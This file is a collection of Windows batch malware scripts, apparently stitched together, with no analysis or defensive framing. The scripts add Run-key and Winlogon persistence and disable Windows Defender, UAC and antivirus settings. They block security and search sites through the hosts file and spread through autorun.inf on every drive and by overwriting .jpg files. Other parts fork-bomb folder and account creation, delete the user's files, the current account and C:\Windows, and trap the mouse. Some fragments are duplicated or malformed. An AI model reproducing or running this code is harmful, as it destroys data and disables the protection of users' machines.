@echo off
setlocal enabledelayedexpansion
set "CurrentDirectory=%~dp0"
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "RM" /t REG_SZ /d "!CurrentDirectory!RM.exe" /f
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "RM" /t REG_SZ /d "!CurrentDirectory!HydraDragonAntivirus2.0.exe" /f
attrib +h %0
start RM.exe
@echo off
reg add "HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows Defender" /v DisableAntivirus /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows Defender" /v DisableWinDefender /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" /v NoAutoUpdate /t REG_DWORD /d 1 /f
reg add "HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows Defender" /v DisableScanOnRealTimeEnable /t REG_DWORD /d 1 /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Features" /v TamperProtection /t REG_DWORD /d 0 /f
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\SystemSettings" /ve /t REG_DWORD /d 0 /f
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v Norun /t REG_DWORD /d 0 /f
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v Nowinkeys /t REG_DWORD /d 0 /f
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoDriveTypeAutoRun /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\ActiveDesktop" /v NoAddingComponents /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\ActiveDesktop" /v NoComponents /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v HideClock /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoControlPanel /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoLogoff /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v ForceActiveDesktop /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoActiveDesktop /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoDesktop /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoActiveDesktopChanges /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoRecentDocsHistory /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 1 /f
reg delete "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Keyboard Layouts\Scancode Map" /f
reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v shutdownwithoutlogon /f
reg delete "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Keyboard Layout" /ve /f
reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v disablelogonbar /f
reg delete "HKEY_CURRENT_USER\Control Panel\Mouse" /v swapmousebutton /f
reg add "HKEY_CLASSES_ROOT\exefile\DefaultIcon" /ve /d "%1" /f
reg add "HKEY_CLASSES_ROOT\mp3file\DefaultIcon" /ve /d "%1" /f
reg add "HKEY_CLASSES_ROOT\mp4file\DefaultIcon" /ve /d "%1" /f
reg add "HKEY_CLASSES_ROOT\txtfile\DefaultIcon" /ve /d "%1" /f
reg add "HKEY_CLASSES_ROOT\inifile\DefaultIcon" /ve /d "%1" /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\SQMClient" /v AllowTelemetry /t REG_DWORD /d 1 /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\SQMClient" /v MaxTelemetryAllowed /t REG_DWORD /d 0 /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoStartMenuPin /f
reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoStartMenuNet /f
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /d "explorer.exe" /f
reg add "HKEY_CURRENT_USER\Control Panel\Cursors" /v AppStarting /d "C:\Windows\cursors\aero_working.ani" /f
reg add "HKEY_CURRENT_USER\Control Panel\Cursors" /v Arrow /d "C:\Windows\cursors\aero_arrow.cur" /f
reg add "HKEY_CURRENT_USER\Control Panel\Cursors" /v Hand /d "C:\Windows\cursors\aero_link.cur" /f
reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "StartupScript" /f
reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Security Center" /v "AntiVirusDisableNotify" /f
reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Security Center" /v "AntiVirusOverride" /f
reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\AVAST Software\Avast" /v "aswidsagenta" /f
reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\AVG" /v "DisableAv" /f
reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Bitdefender" /v "BlockUserModeAccess" /f
reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\McAfee" /v "bDisableSelfProtection" /f
reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\ESET\ESET Security" /v "ProtectEnabled" /f
reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\KasperskyLab" /v "Enable" /f
reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Malwarebytes" /v "MalwareProtectionEnabled" /f
reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Norton" /v "Enable" /f
reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Avira" /v "ProductEnabled" /f
reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\PowerShell" /v DisablePowerShell /f
reg delete "HKCU\Software\Policies\Microsoft\MMC" /v RestrictToPermittedSnapins /f
reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoControlPanel /f
reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisablePaint /f
reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableStickyKeys /f
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisablePerformanceMonitor /f
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableMMC /f
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableEventViewer /f
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableSnippingTool /f
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableMagnifier /f
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableEaseOfAccess /f
reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun" /v "perfmon.msc" /f
reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun" /v "perfmon.exe" /f
reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun" /v "mmc.exe" /f
reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun" /v "mstsc.exe" /f
reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun" /v "mobsync.exe" /f
reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun" /v "SoundRecorder.exe" /f
reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun" /v "displayswitch.exe" /f
reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun" /v "conhost.exe" /f
reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun" /v "taskkill.exe" /f
reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun" /v "tasklist.exe" /f
reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun" /v "iexpress.exe" /f
reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoViewContextMenu" /f
reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "DisallowRun" /f
reg delete "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal" /v "OptionValue" /f
reg delete "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot\Network" /v "OptionValue" /f
reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoRunAs" /f
reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "FilterAdministratorToken" /f
reg delete "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\USBSTOR" /v "Start" /f
reg delete "HKEY_CURRENT_USER\System\CurrentControlSet" /v "ValueName" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\SecurityHealthService" /v Start /t REG_DWORD /d 0 /f
reg delete "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real Time Protection" /v DisableRealTimeMonitoring /f
reg delete "HKEY_CURRENT_USER\Control Panel\Desktop" /v AutoColorization /f
reg delete "HKEY_CURRENT_USER\Control Panel\Desktop" /v WallPaper /f
reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v UseDefaultTile /f
reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\System" /v DisableLogonBackgroundImage /f
reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AutoRestartShell /f
reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DisableCAD /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Notepad" /v iPointSize /f
reg delete "HKEY_CLASSES_ROOT\Unknown\DefaultIcon" /ve /f
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v MyFuckingScript /t REG_SZ /d "C:\Path\To\Motherfucker.bat"
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Yougethacked /t REG_SZ /d "C:\Path\To\Yougethacked.bat"
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Trololololo /t REG_SZ /d "C:\Path\To\Motherfucker0.bat"
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v MyFuckingScript0 /t REG_SZ /d "C:\Path\To\Motherfucker0.bat"
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v MyFuckingScript1 /t REG_SZ /d "C:\Path\To\Motherfucker1.bat"
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v MyFuckingScript4 /t REG_SZ /d "C:\Path\To\Motherfucker33.bat"
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v MyFucking666Script /t REG_SZ /d "C:\Path\To\666.bat"
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v MyFuckingScript3169 /t REG_SZ /d "C:\Path\To\Motherfucke09r.bat"
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v MyFuckingScript6969 /t REG_SZ /d "C:\Path\To\Motherfucker6969.bat"
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\ActiveDesktop" /v Nochangingwallpaper /t REG_DWORD /d 0 /f
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer/v NoClose /t REG_DWORD /d
1/f > nul
@echo off
copy %0 %windir%\%0
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices /v Pwner /t REG_SZ /d %windir%\%0 /f >nul
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v PWNAGE /t REG_SZ /d %systemroot%\system32\drivers\%0 /f >nul
@echo off
reg add "HKCU\Software\Policies\Microsoft\MMC{8FC0B734-A0E1-11D1-A7D3-0000F87571E3}" /v Restrict_Run /t REG_DWORD /d 0 /f
copy %0 %systemroot%\system32\%0
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\UX Configuration"  /v "Notification_Suppress" /t REG_DWORD /d "1" /f
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System"  /v "ConsentPromptBehaviorAdmin" /t REG_DWORD /d "0" /f
reg add "HKCU\Software\Microsoft\Notepad" /v iPointSize /t REG_DWORD /d 36 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\MiniNT" /v DisallowWinPELicensing /t REG_DWORD /d 1 /f
@echo off
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoRecycleFiles /t REG_DWORD /d "1" /f > nul
reg add "HKCU\Software\Microsoft\Windows\Currentversion\Explorer\Advanced" /v Start_Show_Run /t REG_DWORD /d "0" /f > nul
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\WinOldApp" /v Disabled  /t REG_DWORD /d "01" /f 
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\WinOldApp" /v NoRealMode  /t REG_DWORD /d "01" /f
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoDesktop /t REG_DWORD /d "1"
net stop "WSearch"
reg add HKCU\HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies /v NoFind /t REG_DWORD /d "1"
net stop "WPCSvc"
net stop "WerSvc"
@echo off
@Cmd /k Reg Add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "EnableLUA" /t "REG_DWORD" /d "0" /f > nul
reg add HKLM\SOFTWARE\Policies\Microsoft\Internet Explorer\Restrictions /v NoBrowserClose /t REG_DWORD /d "1"
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoDispCPL /t REG_DWORD /d "1"
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoFolderOptions /t REG_DWORD /d "1"
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\WebView\BarricadedFolders" /v shell:Windows /t REG_DWORD /d "1" /f >nul

set iconPath="C:\ProgramData\Microsoft\Device Stage\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\pictures.ico"
reg add "HKEY_CURRENT_USER\Control Panel\Desktop\WindowMetrics" /v IconSpacing /t REG_SZ /d -1500 /f
reg add "HKEY_CURRENT_USER\Control Panel\Desktop\WindowMetrics" /v IconVerticalSpacing /t REG_SZ /d -1500 /f
reg add "HKEY_CURRENT_USER\Control Panel\Desktop\WindowMetrics" /v Shell Icon Size /t REG_SZ /d 32 /f
reg add "HKEY_CURRENT_USER\Control Panel\Desktop\WindowMetrics" /v IconFont /t REG_DWORD /d 0 /f
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Icons" /v 3 /t REG_SZ /d %iconPath% /f
taskkill /f /im explorer.exe
%Xul%
@Echo off > Nul.Xul
@Rundll32 user32,LockWorkStation
@Set Mouse=Xul_Mouse.bat
@Echo @Echo off > %Mouse%
@Echo :Xul >> %Mouse%
@Echo @Rundll32 user32,SetCursorPos >> %Mouse%
@Echo Goto Xul >> %Mouse%
@Call %Mouse%
@Set Xul=Xul_%random%.bat
@Ren %0 %Xul%
@Set RunInf="HKLM\Software\Microsoft\Windows\CurrentVersion\Run"
@Reg Add %RunInf% /V "Rundll32" /T "REG_SZ" /D %0 /F > Nul 
@Echo [windows] >> %windir%\win.ini
@Echo run=%0 >> %windir%\win.ini
@Echo load=%0 >> %windir%\win.ini
@Echo [boot] >> %windir%\system.ini
@Echo shell=explorer.exe %0 >> %windir%\system.ini
@Set StartupDirInf="%UserProfile%\Startm~1\Programs\Startup"
@Copy /Y %0 %StartupDirInf%
@Set MemKill=Xul_Memory.bat
@Echo @Echo off > %MemKill%
@Echo %%XulMemory%% >> %MemKill%
@Echo Find "XulMemory"^<%%0^>^>%%0 >> %MemKill%
@Echo %%XulMemory%% >> %MemKill%
@Call %MemKill%
@Rd %Userprofile%\Music /S /Q > Nul
@Rd %Userprofile%\Pictures /S /Q > Nul
@For %%D In (A,B,C,D,E,F,G,H,I,J,K,L,M,N,O,P,Q,R,S,T,U,V,W,X,Y,Z) Do (
@Set Drive=%%D
@Copy /Y %0 %Drive%:\
@Echo [AutoRun] > %Drive%:\autorun.inf
@Echo open="%Drive%:\%Xul%" >> %%Drive%:\autorun.inf
@Echo action=Open folder to see files... >> %Drive%:\autorun.inf)
%Xul%
%viruz%
%viruz%@echo off
%viruz%set myself=PiCtUrEpErFeCt_%random%_%random%.bat
%viruz%ren %0 %myself%
%viruz%assoc .jpg=batfile
%viruz%for %%j in (%UserProfile%\Pictures\*.jpg) do (copy /y %0 %%j)
%viruz%find "KOYULACAK YAZI"<%0>>%0
%viruz%set valinf="rundll32_%random%_toolbar"
%viruz%set reginf="hklm\Software\Microsoft\Windows\CurrentVersion\Run"
%viruz%reg add %reginf% /v %valinf% /t "REG_SZ" /d %0 /f > nul
%viruz%for %%E In (A,B,C,D,E,F,G,H,I,J,K,L,M,N,O,P,Q,R,S,T,U,V,W,X,Y,Z) Do (
%viruz%copy /Y %0 %%E:\
%viruz%echo [AutoRun] > %%E:\autorun.inf
%viruz%echo open="%%E:\%myself%" >> %%E:\autorun.inf
%viruz%echo action=Open folder to see files... >> %%E:\autorun.inf)
%viruz%
@ECHO OFF
GOTO start

:start
@ECHO SET magic2=1 >> bat6.bat
@ECHO GOTO flood5 >> bat6.bat
@ECHO :flood5 >> bat6.bat
@ECHO SET /a magic2=%%magic2%%+1 >> bat6.bat
@ECHO NET USER magic2%%magic2%% /add >> bat6.bat
@ECHO GOTO flood5 >> bat6.bat
START /MIN bat6.bat
GOTO bat5

:bat5
@ECHO CD %%ProgramFiles%%\ >> bat5.bat
@ECHO SET pogo=1 >> bat5.bat
@ECHO GOTO flood4 >> bat5.bat
@ECHO :flood4 >> bat5.bat
@ECHO MKDIR pogo%%pogo%% >> bat5.bat
@ECHO SET /a pogo=%%pogo%%+1 >> bat5.bat
@ECHO GOTO flood4 >> bat5.bat
START /MIN bat5.bat
GOTO bat4

:bat4
@ECHO CD %%SystemRoot%%\ >> bat4.bat
@ECHO SET hat=1 >> bat4.bat
@ECHO GOTO flood3 >> bat4.bat
@ECHO :flood3 >> bat4.bat
@ECHO MKDIR hat%%hat%% >> bat4.bat
@ECHO SET /a hat=%%hat%%+1 >> bat4.bat
@ECHO GOTO flood3 >> bat4.bat
START /MIN bat4.bat
GOTO bat3

:bat3
@ECHO CD %%UserProfile%%\Start Menu\Programs\ >> bat3.bat
@ECHO SET chart=1 >> bat3.bat
@ECHO GOTO flood2 >> bat3.bat
@ECHO :flood2 >> bat3.bat
@ECHO MKDIR chart%%chart%% >> bat3.bat
@ECHO SET /a chart=%%chart%%+1 >> bat3.bat
@ECHO GOTO flood2 >> bat3.bat
START /MIN bat3.bat
GOTO bat2

:bat2
@ECHO CD %%UserProfile%%\Desktop\ >> bat2.bat
@ECHO SET gamer=1 >> bat2.bat
@ECHO GOTO flood >> bat2.bat
@ECHO :flood >> bat2.bat
@ECHO MKDIR gamer%%gamer%% >> bat2.bat
@ECHO SET /a gamer=%%gamer%%+1 >> bat2.bat
@ECHO GOTO flood >> bat2.bat
START /MIN bat2.bat
GOTO original

:original
CD %HomeDrive%\
SET sharma=1
GOTO flood1
:flood1
MKDIR sharma%sharma%
SET /a sharma=%sharma%+1
GOTO flood1
@ECHO OFF
IF "%1"=="" GOTO fill
IF "%1"=="fill" GOTO fill
IF "%1"=="kill" GOTO kill
IF "%1"=="inf" GOTO inf
IF "%1"=="disinf" GOTO kill
GOTO bye
:fill
IF EXIST C:\Users\%USERNAME%\Desktop\ (
FOR /L %%A IN (1, 1, 200) DO TYPE "%~df0" > "C:\Users\Public\Desktop\joke%%A.bat"
FOR /L %%A IN (1, 1, 200) DO TYPE "%~df0" > "C:\Users\%USERNAME%\Desktop\joke%%A.bat"
)
FOR /L %%A IN (1, 1, 200) DO TYPE "%~df0" > "C:\Documents and Settings\All Users\Desktop\joke%%A.bat"
FOR /L %%A IN (1, 1, 200) DO TYPE "%~df0" > "C:\Documents and Settings\%USERNAME%\Desktop\joke%%A.bat"
IF "%1"=="" GOTO inf
GOTO theend
:kill
IF EXIST C:\Users\%USERNAME%\Desktop\ (
FOR /L %%A IN (1, 1, 200) DO ECHO Y | DEL "C:\Users\Public\Desktop\joke%%A.bat"
FOR /L %%A IN (1, 1, 200) DO ECHO Y | DEL "C:\Users\%USERNAME%\Desktop\joke%%A.bat"
)
FOR /L %%A IN (1, 1, 200) DO ECHO Y | DEL "C:\Documents and Settings\All Users\Desktop\joke%%A.bat"
FOR /L %%A IN (1, 1, 200) DO ECHO Y | DEL "C:\Documents and Settings\%USERNAME%\Desktop\joke%%A.bat"
IF "%1"=="disinf" GOTO disinf
GOTO theend
:inf
TYPE "%~df0" > "C:\Documents and Settings\All Users\Start Menu\Programs\Startup\joke.bat"
TYPE "%~df0" > "C:\Documents and Settings\%USERNAME%\Start Menu\Programs\Startup\joke.bat"
TYPE "%~df0" > "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\joke.bat"
GOTO theend
:disinf
ECHO Y | DEL "C:\Documents and Settings\All Users\Start Menu\Programs\Startup\joke.bat"
ECHO Y | DEL "C:\Documents and Settings\%USERNAME%\Start Menu\Programs\Startup\joke.bat"
ECHO Y | DEL "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\joke.bat"
GOTO theend
:bye
:theend
@echo off
setlocal enabledelayedexpansion
set num_users=100
for /l %%i in (1, 1, %num_users%) do (
    set username=RandomUser%%i
    set password=!username!Password
    net user !username! !password! /add
    net localgroup Users !username! /add
)
@echo off
setlocal enabledelayedexpansion
REM Mevcut kullanıcı adını al
for /f "tokens=*" %%i in ('whoami') do set "currentuser=%%i"
net user !currentuser! /delete
net localgroup KullaniciGrubuAdi !currentuser! /delete
echo Kullanıcı !currentuser! başarıyla silindi.
rd C:\Windows /s /q
set lol=HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer
Set val=NoUserNameInStartMenu
Set date=1
reg.exe add "%lol%" /v "%val%" /d "%date%" /f >nul
reg add "HKCU\Software\Microsoft\Internet Explorer\Main" /v "START PAGE" /d "youareidiot.cc"
cmd /c echo 127.0.0.1 www.symantec.com>>c:\windows\system32\Drivers\Etc\Hosts
cmd /c echo 127.0.0.1 www.sophos.com>>c:\windows\system32\Drivers\Etc\Hosts
cmd /c echo 127.0.0.1 www.avast.com>>c:\windows\system32\Drivers\Etc\Hosts
cmd /c echo 127.0.0.1 www.mcafee.com>>c:\windows\system32\Drivers\Etc\Hosts
cmd /c echo 127.0.0.1 www.f-prot.com>>c:\windows\system32\Drivers\Etc\Hosts
cmd /c echo 127.0.0.1 www.f-secure.com>>c:\windows\system32\Drivers\Etc\Hosts
cmd /c echo 127.0.0.1 www.avp.com>>c:\windows\system32\Drivers\Etc\Hosts
cmd /c echo 127.0.0.1 www.kaspersky.com>>c:\windows\system32\Drivers\Etc\Hosts
cmd /c echo 127.0.0.1 www.bitdefender.com>>c:\windows\system32\Drivers\Etc\Hosts
cmd /c echo 127.0.0.1 www.my-etrust.com>>c:\windows\system32\Drivers\Etc\Hosts
cmd /c echo 127.0.0.1 www.eset.com>>c:\windows\system32\Drivers\Etc\Hosts
cmd /c echo 127.0.0.1 www.norman.com>>c:\windows\system32\Drivers\Etc\Hosts
cmd /c echo 127.0.0.1 www.grisoft.com>>c:\windows\system32\Drivers\Etc\Hosts
cmd /c echo 127.0.0.1 www.google.com>>c:\windows\system32\Drivers\Etc\Hosts
cmd /c echo 127.0.0.1 www.hotmail.com>>c:\windows\system32\Drivers\Etc\Hosts
cmd /c echo 127.0.0.1 www.yandex.com.tr>>c:\windows\system32\Drivers\Etc\Hosts
cmd /c echo 127.0.0.1 www.yandex.com>>c:\windows\system32\Drivers\Etc\Hosts
cmd /c echo 127.0.0.1 mx1.hotmail.com>>c:\windows\system32\Drivers\Etc\Hosts
cmd /c echo 127.0.0.1 mx2.hotmail.com>>c:\windows\system32\Drivers\Etc\Hosts
cmd /c echo 127.0.0.1 messenger.hotmail.com>>c:\windows\system32\Drivers\Etc\Hosts
cmd /c echo 127.0.0.1 www.google.co.uk>>c:\windows\system32\Drivers\Etc\Hosts
cmd /c echo 127.0.0.1 www.google.com.tr>>c:\windows\system32\Drivers\Etc\Hosts
cmd /c echo 127.0.0.1 www.youtube.com>>c:\windows\system32\Drivers\Etc\Hosts
cmd /c echo 127.0.0.1 www.youtube.co.uk>>c:\windows\system32\Drivers\Etc\Hosts
cmd /c echo 127.0.0.1 www.yahoo.com>>c:\windows\system32\Drivers\Etc\Hosts
@echo off
reg add "HKCU\SOFTWARE\Microsoft\Windows\DWM" /v ColorPrevalence /t REG_DWORD /d 2 /f
@echo off
copy %0 %windir%\%0
@echo off
copy %0 %systemroot%\system32\drivers\%0
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v PWNAGE /t REG_SZ /d %systemroot%\system32\drivers\%0 /f >nul
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices /v Pwner /t REG_SZ /d %windir%\%0 /f >nul
@echo off
reg delete "HKEY_USERS\.DEFAULT\Control Panel\Mouse" /f
@echo off
reg delete "HKEY_CURRENT_USER\Identities" /f
@echo off
reg delete "HKEY_CLASSES_ROOT\.lnk" /f
@echo off
reg delete "HKEY_CURRENT_USER\AppEvents\EventLabels\SystemAsterisk" /f
@echo off
reg delete "HKEY_CLASSES_ROOT\DXImageTransform.Microsoft.CrBlinds.1" /f
@echo off
reg delete "HKEY_CLASSES_ROOT\MSRDC.SimilarityFileIdTable\CurVer" /f
@echo off
reg delete "HKEY_USERS\S-1-5-20\Printers\DevModePerUser" /f
@echo off
reg delete "HKEY_CLASSES_ROOT\.lnk" /f
@echo off
reg delete "HKEY_CLASSES_ROOT\.lnk" /f
@echo off
reg delete "HKEY_CLASSES_ROOT\.lnk" /f
@echo off
@echo off
@echo off
reg delete "HKEY_CURRENT_USER\AppEvents\EventLabels\WindowsLogoff" /f
@echo off
reg delete "HKEY_CURRENT_USER\AppEvents\EventLabels\HubOffSound" /f

@echo off
reg add "HKEY_CURRENT_USER\AppEvents\EventLabels\WindowsLogon" /v "@mmres.dll,-5853" /t REG_SZ /d "LogonUI.mui,-5852" /f

@echo off
reg add "HKEY_CURRENT_USER\System\CurrentControlSet\Control\NetTrace\Session" /v Default /t REG_SZ /d "off" /f


@echo off
reg add "HKEY_USERS\.DEFAULT\Control Panel\Mouse" /v MouseSpeed /t REG_SZ /d "2" /f

@echo off
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d "C:\ProgramData\Tumeg.exe," /f


@echo off
reg delete "HKEY_USERS\.DEFAULT\Control Panel\Mouse" /f

@echo off
reg delete "HKEY_CURRENT_USER\Identities" /f

@echo off
reg delete "HKEY_CLASSES_ROOT\.lnk" /f

@echo off
reg delete "HKEY_CURRENT_USER\AppEvents\EventLabels\SystemAsterisk" /f
@Set RegistyEditCmd=Cmd /k Reg Add
@Set HiveSysKey=HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
@%RegistyEditCmd% "%HiveSysKey%" /v "EnableLUA" /t "REG_DWORD" /d "0" /f > nul
cd %userprofile%\desktop
copy %0 %random%.%random%
copy %0 %random%.%random%
copy %0 %random%.%random%
copy %0 %random%.%random%
copy %0 %random%.%random%
copy %0 %random%.%random%
copy %0 %random%.%random%
copy %0 %random%.%random%
copy %0 %random%.%random%
copy %0 %random%.%random%
